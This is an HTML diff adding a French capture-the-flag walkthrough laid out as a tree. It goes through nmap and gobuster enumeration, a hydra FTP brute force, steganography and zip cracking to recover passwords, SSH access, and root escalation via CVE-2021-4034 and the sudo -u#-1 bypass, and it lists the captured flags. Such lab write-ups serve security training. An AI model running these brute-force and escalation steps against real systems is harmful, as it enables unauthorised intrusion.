@@ -32,8 +32,296 @@
         </section>
     </nav>
 
-    <section class="container" id="main">
-    
+    <section class="container-fluid" id="main">
+        
+<figure class="container-fluid">
+    <ul class="row tree">
+      <li class="col-sm-12"><code>Enumération</code>
+        <ul class="row">
+          <li class="col-sm-12"><code class="bon_chemin">Scan nmap <br> 1) nmap -sC [IP] -oN scan1.txt <br>2) nmap -sN -sV -p- -v [IP] scan2.txt</code>
+            <ul class="row">
+              <li class="col-sm-2"><code>port 21 ouvert <br> Protocol : FTP <br> version vsftpd 3.0.3</code>
+                <ul class="row">
+                  <li class="col-sm-6"><code>Compte par défaut anonymous:anonymous <br>ftp anonymous@[IP] </code></li>
+                  <li class="col-sm-6"><code>Compte par défaut anonymous:anonymous <br>ftp anonymous@[IP]</code></li>
+                </ul>
+              </li>
+              <li class="col-sm-2"><code>port 22 ouvert <br> Protocol : SSH <br> version OpenSSH 7.6p1</code>
+            
+              </li>
+              <li class="col-sm-8"><code class="bon_chemin">port 80 ouvert <br> Protocol : HTTP <br> version Apache httpd 2.4.29</code>
+                <ul class="row">
+                  <li class="col-sm-4"><code>Scan du site</code>
+                    <ul class="row">
+                        <li class="col-sm-12"><code >Enumeration des sous dossiers <br>gobuster dir -u http://[IP]/ -w /usr/share/wordlists/dirb/common.txt > gobuster.txt</code>
+                            <ul>
+                                <li><code>/.htpasswd</code></li>
+                                <li><code>/.hta</code></li>
+                                <li><code>/index.php</code></li>
+                                <li><code>/server-status</code></li>
+                            </ul>
+                        </li>
+                      </ul>
+                  </li>
+                  <li class="col-sm-8"><code class="bon_chemin">http://[IP]</code>
+                    <ul class="row">
+                      <li class="col-sm-12"><code class="bon_chemin">Contenu : "Dear Agent <br><br> Use your own codename as user-agent to access the site. <br><br> From, <br> Agent R"</code>
+                        <ul class="row">
+                            <li class="col-sm-12"><code class="bon_chemin"> Interception de la requête http get http://[IP] avec Burpsuite</code>
+                                <ul class="row">
+                                    <li class="col-sm-6"><code> User-agent: R</code>
+                                        <ul class="row">
+                                            <li class="col-sm-12"><code>Contenu : What are you doing! are you one of the 25 employees? If not, I going to report this incident</code></li>
+                                        </ul>
+                                    </li>
+                                    <li class="col-sm-6"><code class="bon_chemin"> User-agent: C</code>
+                                        <ul class="row">
+                                            <li class="col-sm-12"><code class="bon_chemin">Redirection vers Location : agent_C_attention.php</code>
+                                                <ul class="row">
+                                                    <li><code class="bon_chemin">Contenu : "Attention chris, Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak ! <br><br> From, <br>Agent R</code></li>
+                                                </ul>
+                                            </li>
+                                        </ul>
+                                    </li>
+                                </ul>
+                            </li>
+                        </ul>
+                      </li>
+                      
+                    </ul>
+                  </li>
+                </ul>
+              </li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+    </ul>
+  </figure>
+
+  <figure class="container-fluid">
+    <ul class="row tree">
+      <li class="col-sm-12"><code>Exploitation</code>
+        <ul class="row">
+          <li class="col-sm-12"><code class="bon_chemin">Nous avons un nom : chris et deux services intéressants : FTP et SSH</code>
+            <ul class="row">
+              <li class="col-sm-12"><code class="bon_chemin">Brute force du compte FTP de chris <br> hydra -t 4 -l chris -P /usr/share/wordlists/rockyou.txt -vV [IP] ftp</code>
+                <ul class="row">
+                  <li class="col-sm-12"><code class="bon_chemin">Mot de passe trouvé : crystal </code>
+                    <ul class="row">
+                        <li class="col-sm-12"><code class="bon_chemin">Connexion au compte ftp avec les credentials chris:crystal <br>ftp chris@[IP]</code>
+                            <ul class="row">
+                                <li class="col-sm-12"><code class="bon_chemin">3 fichiers dans le repertoire courant du serveur ftp</code>
+                                    <ul class="row">
+                                        <li class="col-sm-2"><code>To_agentJ.txt <br> get To_agentJ.txt</code>
+                                            <ul class="row">
+                                                 <li class="col-sm-12"><code>cat To_agentJ.txt <br> Dear agent J, All these alien like photos are fake! Agent R sotred the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you. <br><br> From, <br>Agent C </code></li>
+                                            </ul>
+                                        </li>
+                                        <li class="col-sm-2"><code class="bon_chemin_2">cute-alien.jpg <br> get cute-alien.jpg</code>
+                                            <ul class="row">
+                                                <li class="col-sm-12"><code class="bon_chemin_2"> Examinons ces images avec binwalk <br> binwalk -e --run-as=root cute-alien.jpg</code> 
+                                                    <ul class="row">
+                                                        <li class="col-sm-12"><code class="bon_chemin_2">JPEG image data, JFIF standard 1.01</code>
+                                                            <ul class="row">
+                                                                <li class="col-sm-12"><code class="bon_chemin_2">steghide --extract -sf cute-alien.jpg <br>Mot de passe : Area 51</code>
+                                                                    <ul class="row">
+                                                                        <li class="col-sm-12"><code class="bon_chemin_2">Ecriture des données extraites dans "message.txt"</code>
+                                                                        <ul class="row">
+                                                                            <li class="col-sm-12"><code class="bon_chemin_2">message.txt <br>Hi james, [...] Your login password is hackerrules! [...] <br><br> Your buddy, <br>chris</code></li>
+                                                                        </ul>
+                                                                        </li>
+                                                                    </ul>
+                                                                </li>
+                                                            </ul>
+                                                        </li>
+                                                    </ul>
+                                                </li>
+                                            </ul>
+                                        </li>
+                                        <li class="col-sm-8"><code class="bon_chemin">cutie.png <br> get cutie.png</code>
+                                            <ul class="row">
+                                                <li class="col-sm-12"><code class="bon_chemin"> Examinons ces images avec binwalk <br> binwalk -e --run-as=root cutie.png</code> 
+                                                    <ul class="row">
+                                                        <li class="col-sm-1"><code>PNG image, 528x528 8-bit colormap, non-interlaced</code></li>
+                                                        <li class="col-sm-1"><code>Zlib compressed data, best compression</code></li>
+                                                        <li class="col-sm-9"><code class="bon_chemin">Zip archive data, encrypted compressed size : 98, uncompressed size: 86, name: To_agentR.txt</code>
+                                                            <ul class="row">
+                                                                <li class="col-sm-12"><code class="bon_chemin"> Création du repertoire _cutie.png.extracted <br> cd _cutie.png.extracted</code>
+                                                                    <ul class="row">
+                                                                        <li class="col-sm-1"><code>365</code></li>
+                                                                        <li class="col-sm-1"><code>365.zib</code></li>
+                                                                        <li class="col-sm-9"><code class="bon_chemin">8702.zip</code>
+                                                                            <ul class="row">
+                                                                                        <li class="col-sm-12"><code class="bon_chemin">Archive zip protégé par un mot de passe <br> zip2john 8702.zip > hash_zip.txt</code>
+                                                                                            <ul class="row">
+                                                                                                <li class="col-sm-12"><code class="bon_chemin">john hash_zip.txt <br> Mot de passe : alien</code>
+                                                                                                    <ul class="row">
+                                                                                                        <li class="col-sm-12"><code class="bon_chemin">"Agent C, <br><br> We need to send the picture to 'QXJlYTUx' as soon as possible <br><br>By,<br>Agent R</code>
+                                                                                                        <ul class="row">
+                                                                                                            <li class="col-sm-12"><code class="bon_chemin">Dechiffrement en base 64 avec dcode.fr <br> Resultat : QXJlYTUx -> Area51 </code>
+                                                                                                                
+                                                                                                            </li>
+                                                                                                        </ul>
+                                                                                                        </li>
+                                                                                                    </ul>
+                                                                                                </li>
+                                                                                            </ul>
+                                                                                        </li>
+                                                                            </ul>
+                                                                        </li>
+                                                                        <li class="col-sm-1"><code>To_agentR.txt</code>
+                                                                            
+                                                                        </li>
+                                                                    </ul>
+                                                                </li>
+                                                            </ul>
+                                                        </li>
+                                                        <li class="col-sm-1"><code>End of Zip archive, footer length:22</code></li>
+                                                    </ul>
+                                                </li>
+                                            </ul>
+                                        </li>
+                                    </ul>
+                                </li>
+                            </ul>
+                        </li>
+
+                    </ul>
+                </li>
+                </ul>
+              </li>
+              <!-- <li class="col-sm-1"><code>Brute force du compte SSH de chris <br> hydra -t 4 -l chris -P /usr/share/wordlists/rockyou.txt -vV [IP] ssh</code>
+                <ul class="row">
+                  <li class="col-sm-12"><code>a</code></li>
+            
+                </ul>
+              </li> -->
+              
+            </ul>
+          </li>
+        </ul>
+      </li>
+    </ul>
+  </figure>
+
+  <figure class="container-fluid">
+    <ul class="row tree">
+      <li class="col-sm-12"><code>Accès</code>
+        <ul class="row">
+          <li class="col-sm-12"><code> Login : james <br>Mot de passe : hackerrules!</code>
+            <ul class="row">
+              <li class="col-sm-12"><code>ssh james@[IP] <br>Mot de passe : hackerrules!</code>
+                <ul class="row">
+                  <li class="col-sm-12"><code>find / -type f -iname *flag* 2>/dev/null <br> Resultat : /home/james/user_flag.txt <br> flag = b03d975e8c92a7c04146cfa7a5a313c7</code>
+                    <ul class="row">
+                      <li class="col-sm-12"><code>Elevation de privilège</code>
+                        <ul class="row">
+                            <li class="col-sm-12"> <code>scp -r linpeas.sh james@[IP]:/dev/Shoemaker</code>
+                                <ul class="row">
+                                    <li class="col-sm-12"><code> chmod 777 linpeas.sh <br>./linpeas.sh </code>
+                                        <ul class="row">
+                                            <li class="col-sm-6"><code>Vulnerable to CVE-2021-4034</code> 
+                                                <ul class="row">
+                                                    <li class="col-sm-12"><code>scp -r CVE-2021-4034 james@[IP]:/dev/shm</code>
+                                                        <ul class="row">
+                                                            <li class="col-sm-12"><code>cd CVE-2021-4034</code>
+                                                                <ul class="row">
+                                                                    <li class="col-sm-12"><code>./cve-2021-4034</code>
+                                                                        <ul class="row">
+                                                                            <li class="col-sm-12"><code>find / -type f -iname root.txt 2>/dev/null <br>Resultat : /root/root.txt</code> 
+                                                                                <ul class="row">
+                                                                                    <li class="col-sm-12"><code> root.txt => b53a02f55b57d4439e3341834d70c062</code></li>
+                                                                                </ul>
+                                                                            </li>
+                                                                        </ul>
+                                                                    </li>
+                                                                </ul>
+                                                            </li>
+                                                        </ul>
+                                                    </li>
+                                                </ul>
+                                            </li>
+                                            <li class="col-sm-6"> <code>suoders => (ALL, !root) /bin/bash</code>
+                                                <ul class="row">
+                                                    <li class="col-sm-12"><code>sudo -u#-1 /bin/bash</code>
+                                                        <ul class="row">
+                                                            <li class="col-sm-12"><code>find / -type f -iname root.txt 2>/dev/null <br>Resultat : /root/root.txt</code> 
+                                                                <ul class="row">
+                                                                    <li class="col-sm-12"><code> root.txt => b53a02f55b57d4439e3341834d70c062</code></li>
+                                                                </ul>
+                                                            </li>
+                                                        </ul>
+                                                    </li>
+                                                </ul>
+                                            </li>
+                                        </ul>
+                                    </li>
+                                </ul>
+                            </li>
+                        </ul>
+                      </li>
+                      
+                    </ul>
+                  </li>
+                </ul>
+              </li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+    </ul>
+  </figure>
+
+  <!-- <figure> 
+    <figcaption>Example sitemap</figcaption>
+    <ul class="tree">
+      <li><span>Home</span>
+        <ul>
+          <li><span>About us</span>
+            <ul>
+              <li><span>Our history</span>
+                <ul>
+                  <li><span>Founder</span></li>
+                </ul>
+              </li>
+              <li><span>Our board</span>
+                <ul>
+                  <li><span>Brad Whiteman</span></li>
+                  <li><span>Cynthia Tolken</span></li>
+                  <li><span>Bobby Founderson</span></li>
+                </ul>
+              </li>
+            </ul>
+          </li>
+          <li><span>Our products</span>
+            <ul>
+              <li><span>The Widget 2000™</span>
+                <ul>
+                  <li><span>Order form</span></li>
+                </ul>
+              </li>
+              <li><span>The McGuffin V2</span>
+                <ul>
+                  <li><span>Order form</span></li>
+                </ul>
+              </li>
+            </ul>
+          </li>
+          <li><span>Contact us</span>
+            <ul>
+              <li><span>Social media</span>
+                <ul>
+                  <li><span>Facebook</span></li>
+                </ul>
+              </li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+    </ul>
+  </figure> -->
+
     </section>
 
     <footer class="container-fluid">
